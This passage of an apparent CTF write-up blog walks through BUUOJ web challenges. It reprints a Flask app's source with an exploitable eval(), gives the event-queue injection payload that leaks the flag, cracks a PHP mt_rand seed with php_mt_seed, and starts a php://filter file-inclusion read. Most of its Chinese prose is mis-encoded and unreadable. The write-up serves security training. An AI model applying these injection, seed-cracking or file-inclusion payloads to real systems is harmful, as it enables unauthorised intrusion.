keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            is_action <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'a'</span>            action <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">)</span>            args <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> action<span class="token operator">+</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                event_handler <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>                    action <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'_handler'</span> <span class="token keyword">if</span> is_action <span class="token keyword">else</span> <span class="token string">'_function'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                ret_val <span class="token operator">=</span> event_handler<span class="token punctuation">(</span>args<span class="token punctuation">)</span>            <span class="token keyword">except</span> RollBackException<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                resp <span class="token operator">+=</span> <span class="token string">'ERROR! All transactions have been cancelled. &lt;br />'</span>                resp <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>                session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>                session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                <span class="token comment"># resp += str(e) # only for debugging</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> ret_val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> ret_val                <span class="token keyword">else</span><span class="token punctuation">:</span>                    resp <span class="token operator">+=</span> ret_val    <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> resp <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'404 NOT FOUND'</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span>    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> resp<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">entry_point</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    querystring <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_string<span class="token punctuation">)</span>    request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> querystring <span class="token operator">==</span> <span class="token string">''</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token keyword">not</span> querystring<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>querystring<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>        querystring <span class="token operator">=</span> <span class="token string">'action:index;False#False'</span>    <span class="token keyword">if</span> <span class="token string">'num_items'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    request<span class="token punctuation">.</span>prev_session <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span>querystring<span class="token punctuation">)</span>    <span class="token keyword">return</span> execute_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># handlers/functions below --------------------------------------</span><span class="token keyword">def</span> <span class="token function">view_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    page <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    html <span class="token operator">=</span> <span class="token string">''</span>    html <span class="token operator">+=</span> <span class="token string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> page <span class="token operator">==</span> <span class="token string">'index'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23False">View source code&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;shop">Go to e-shop&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;reset">Reset&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'shop'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:buy;1">Buy a diamond (1 point)&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'reset'</span><span class="token punctuation">:</span>        <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>        html <span class="token operator">+=</span> <span class="token string">'Session reset.&lt;br />'</span>    html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>    <span class="token keyword">return</span> html<span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    bool_show_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    bool_download_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> bool_show_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>        source <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'eventLoop.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>        html <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23True">Download this .py file&lt;/a>&lt;br />'</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>            <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>                    <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line        source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=serve.py'</span>            <span class="token keyword">return</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> html    <span class="token keyword">else</span><span class="token punctuation">:</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    num_items <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> num_items <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> num_items    trigger_event<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'func:consume_point;&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        num_items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'action:view;index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">consume_point_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    point_to_consume <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> point_to_consume<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RollBackException<span class="token punctuation">(</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">-=</span> point_to_consume<span class="token keyword">def</span> <span class="token function">show_flag_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span>    <span class="token keyword">return</span> <span class="token string">'You naughty boy! ;) &lt;br />'</span><span class="token keyword">def</span> <span class="token function">get_flag_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token comment"># show_flag_function has been disabled, no worries</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'func:show_flag;'</span> <span class="token operator">+</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span></code></pre><p>é¢˜ç›®ä¸­æœ‰flaskï¼Œç½‘ç«™å†…å®¹å’Œè´­ä¹°æœ‰å…³ï¼Œç›²çŒœflask sessioné€»è¾‘æ¼æ´</p><img src="/article/Buuoj-WEB-Write-up/image-20201129174627993.png" class="" title="image-20201129174627993" loading="lazy"><p>æ‹¿å»<code>flask_session_cookie_manager</code>è§£å¯†</p><img src="/article/Buuoj-WEB-Write-up/image-20201129174747409.png" class="" title="image-20201129174747409" loading="lazy"><p><code>&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;YWN0aW9uOnZpZXc7aW5kZXg=&quot;&#125;,&#123;&quot; b&quot;:&quot;YWN0aW9uOnZpZXc7aW5kZXg=&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;</code></p><p>base64å†è§£å¯†å¾—</p><p><code>&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;</code></p><p>åˆ†æserve.py</p><p>å…ˆæ‰¾flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201129175323407.png" class="" title="image-20201129175323407" loading="lazy"><p>å‘ç°åœ¨get_flag_handlerå‡½æ•°é‡Œï¼Œè€Œæ¡ä»¶æ˜¯<code>session[&#39;num_items&#39;] &gt;= 5</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129175427470.png" class="" title="image-20201129175427470" loading="lazy"><p>å†è·³åˆ°buy_handlerå‡½æ•°é‡Œ</p><img src="/article/Buuoj-WEB-Write-up/image-20201129175938047.png" class="" title="image-20201129175938047" loading="lazy"><p>å…³é”®é€»è¾‘</p><p><strong>num_itemsæ•°ç›®å…ˆå¢ï¼Œç„¶åå†æ‰£pointï¼Œå¦‚æœpointä¸å¤Ÿå†æŠŠnum_itemsæ‰£å›å»</strong></p><p>ç„¶åå°±ä¸ä¼šäº†</p><p>å¼€å§‹åˆ†æå¤§ä½¬çš„WP</p><ul><li><p>ä»”ç»†åˆ†æexecute_event_loopï¼Œä¼šå‘ç°é‡Œé¢æœ‰ä¸€ä¸ªevalå‡½æ•°ï¼Œè€Œä¸”æ˜¯å¯æ§çš„ï¼ </p></li><li><p>åˆ©ç”¨eval()å¯ä»¥å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œä½¿ç”¨æ³¨é‡Šç¬¦å¯ä»¥ bypass æ‰åé¢çš„æ‹¼æ¥éƒ¨åˆ†ã€‚ </p></li><li><p>è‹¥è®©eval()å»æ‰§è¡Œtrigger_event()ï¼Œå¹¶ä¸”åœ¨åé¢è·Ÿä¸¤ä¸ªå‘½ä»¤ä½œä¸ºå‚æ•°ï¼Œåˆ†åˆ«æ˜¯buyå’Œget_flagï¼Œé‚£ä¹ˆbuyå’Œget_flagä¾¿å…ˆåè¿›å…¥é˜Ÿåˆ—ã€‚ </p></li><li><p>æ ¹æ®é¡ºåºä¼šå…ˆæ‰§è¡Œbuy_handler()ï¼Œæ­¤æ—¶consume_pointè¿›å…¥é˜Ÿåˆ—ï¼Œæ’åœ¨get_flagä¹‹åï¼Œæˆ‘ä»¬çš„ç›®æ ‡è¾¾æˆã€‚ </p></li></ul><p>æœ€ç»ˆpayloadï¼š</p><pre class="language-none"><code class="language-none">action:trigger_event%23;action:buy;5%23action:get_flag;</code></pre><p>ä¸çŸ¥é“ç¼–ç é—®é¢˜ï¼Ÿ<code>#</code>å¿…é¡»å†™æˆ <code>%23</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129181046007.png" class="" title="image-20201129181046007" loading="lazy"><p>æ‹¿å»è§£å¯†å¾—</p><img src="/article/Buuoj-WEB-Write-up/image-20201129181142945.png" class="" title="image-20201129181142945" loading="lazy"><p>base64è§£å¯†å¾—</p><pre class="language-none"><code class="language-none">&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;action:trigger_event#;action:buy;5#action:get_flag;&quot;&#125;,[&#123;&quot; b&quot;:&quot;action:buy;5&quot;&#125;,&#123;&quot; b&quot;:&quot;action:get_flag;&quot;&#125;],[&#123;&quot; b&quot;:&quot;func:consume_point;5&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&#123;&quot; b&quot;:&quot;func:show_flag;flag&#123;f0c04d65-ffa9-472b-9263-1e308ad45fd8&#125;&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;&#96;</code></pre><p>flagå³åœ¨å…¶ä¸­</p><hr><h2 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129181539620.png" class="" title="image-20201129181539620" loading="lazy"><p>çœ‹æºç æœ‰ä¸ªhiddenæ ‡ç­¾ï¼Œç›´æ¥å»æ‰å¾—åˆ°æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token shell-comment comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p id='p1'>"</span><span class="token punctuation">.</span><span class="token variable">$str_show</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>x        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p id=flag>æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p id=flag>æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>phpä¼ªéšæœºæ•°çˆ†ç ´</p><p>ç”¨php_mt_seed</p><p>æ‰”è™šæ‹Ÿæœºé‡Œmake</p><img src="/article/Buuoj-WEB-Write-up/image-20201129183233275.png" class="" title="image-20201129183233275" loading="lazy"><p>ç„¶åç”¨pythonè„šæœ¬è½¬åŒ–å¾—åˆ°çš„æ•°æ®</p><pre class="language-python" data-language="python"><code class="language-python">str1<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>str2<span class="token operator">=</span><span class="token string">'uG8C1Wg91B'</span>str3 <span class="token operator">=</span> str1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>     <span class="token comment"># reverse</span>length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>    <span class="token comment"># 10</span>res<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            res<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span>            <span class="token keyword">break</span><span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201129184300244.png" class="" title="image-20201129184300244" loading="lazy"><p>ç„¶åè¿è¡Œ<code>./php_mt_seed 54 54 0 61 45 45 0 61 54 54 0 61 7 7 0 61 59 59 0 61 35 35 0 61 4 4 0 61 15 15 0 61 53 53 0 61 40 40 0 61</code></p><p>çˆ†ç ´å¾—<code>394409044</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129184626939.png" class="" title="image-20201129184626939" loading="lazy"><p>å›å»è·‘å‡ºå®Œæ•´å­—ç¬¦ä¸²</p><img src="/article/Buuoj-WEB-Write-up/image-20201129184942098.png" class="" title="image-20201129184942098" loading="lazy"><p><code>SJShX9epREbTBLfdc4Gu</code></p><p>å›å»æäº¤å‡ºflag</p><img src="/article/Buuoj-WEB-Write-up/image-20201129185017278.png" class="" title="image-20201129185017278" loading="lazy"><hr><h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>æ‰“å¼€å°±æ˜¯ç™»é™†ç•Œé¢</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203609192.png" class="" title="image-20201129203609192" loading="lazy"><p>çŒœæƒ³SQLæ³¨å…¥ï¼Œå‘ç°è¿‡æ»¤å¼•å·ï¼Œæš‚æ—¶æ”¾å¼ƒè¿™æ¡è·¯</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203656135.png" class="" title="image-20201129203656135" loading="lazy"><p>ä¸ç»™æ‰«ç›®å½•ï¼Œç›²çŒœè®¿é—®<code>register.php</code>ï¼Œè¿˜çœŸæœ‰</p><p>æ³¨å†Œç”¨æˆ·ç™»é™†è¿›å»</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203815847.png" class="" title="image-20201129203815847" loading="lazy"><p>å‘ç°urlçŒ«è…»ï¼Œæ–‡ä»¶åŒ…å«ï¼Œåˆ©ç”¨ä¼ªåè®®è¯»å–ä¸€ä¸‹index</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203901945.png" class="" title="image-20201129203901945" loading="lazy"><pre class="language-none"><code class="language-none">PD9waHAKcmVxdWlyZV9vbmNlICJmdW5jdGlvbi5waHAiOwppZihpc3NldCgkX1NFU1NJT05bJ2xvZ2luJ10gKSl7CiAgICBIZWFkZXIoIkxvY2F0aW9uOiB1c2VyLnBocD9wYWdlPWluZm8iKTsKfQplbHNlewogICAgaW5jbHVkZSAidGVtcGxhdGVzL2luZGV4Lmh0bWwiOwp9Cj8+</code></pre><p>è§£å¯†å¾—index.phpæºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token double-quoted-string string">"function.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string 